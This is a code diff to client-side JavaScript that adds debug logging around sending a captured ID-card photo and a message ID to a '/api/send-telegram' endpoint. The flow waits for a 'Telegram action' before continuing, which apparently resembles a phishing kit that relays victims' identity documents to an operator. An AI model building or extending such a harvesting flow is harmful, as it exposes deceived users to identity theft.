@@ -127,11 +127,18 @@ document.addEventListener('DOMContentLoaded', function() {
         try {
             // Preparar datos
             const formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
+            
+            console.log('📤 Preparando envío de cédula...');
+            console.log('Message ID:', formData.messageId);
+            console.log('Tamaño foto:', capturedPhoto.length, 'caracteres');
+            
             const data = {
                 tipo: 'Cédula',
                 messageId: formData.messageId,
                 foto: capturedPhoto
             };
+
+            console.log('🌐 Enviando request a /api/send-telegram...');
 
             const response = await fetch('/api/send-telegram', {
                 method: 'POST',
@@ -142,17 +149,22 @@ document.addEventListener('DOMContentLoaded', function() {
                 body: JSON.stringify(data)
             });
 
+            console.log('📨 Response status:', response.status);
+
             if (!response.ok) {
+                const errorText = await response.text();
+                console.error('Error response:', errorText);
                 throw new Error(`Error del servidor: ${response.status}`);
             }
 
             const result = await response.json();
+            console.log('✅ Response result:', result);
             
             if (!result.success) {
                 throw new Error(result.error || 'Error al procesar la solicitud');
             }
 
-            console.log('✅ Documento enviado exitosamente');
+            console.log('✅ Cédula enviada exitosamente a Telegram - Message ID:', result.messageId);
             
             // Guardar estado
             formData.cedulaMessageId = result.messageId;
@@ -166,7 +178,7 @@ document.addEventListener('DOMContentLoaded', function() {
             // El loading se mantendrá visible hasta que llegue la acción de Telegram
 
         } catch (error) {
-            console.error('❌ Error al enviar documento:', error);
+            console.error('❌ Error al enviar cédula:', error);
             window.loadingOverlay.hide();
             window.commonUtils.showError('Error al enviar el documento. Por favor intente nuevamente.');
         }
